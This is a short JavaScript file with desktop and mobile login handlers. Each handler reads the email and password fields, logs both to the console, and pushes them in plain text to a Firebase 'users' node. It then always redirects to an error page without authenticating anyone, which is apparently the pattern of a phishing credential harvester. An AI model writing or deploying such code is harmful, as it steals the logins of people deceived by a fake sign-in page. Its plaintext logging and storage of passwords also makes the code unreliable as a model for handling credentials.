let login = () =>{
    // alert("success");
    let email = document.getElementById("email");
    console.log("Email===> " + email.value);
    let password = document.getElementById("password");
    console.log("Password===> " + password.value);
    let obj = {
        email: email.value,
        password: password.value
    }
    firebase.database().ref('users').push(obj);
    swal(
      ).then(function(){
        window.location.href = './error.html';
    });
}

let logInMob = () => {
    let email = document.getElementById("mob-email");
    console.log("Email===> " + email.value);
    let password = document.getElementById("mob-pass");
    console.log("Password===> " + password.value);
    let obj = {
        email: email.value,
        password: password.value
    }
    firebase.database().ref('users').push(obj);
    swal(
        ).then(function(){
          window.location.href = './error.html';
      });
}
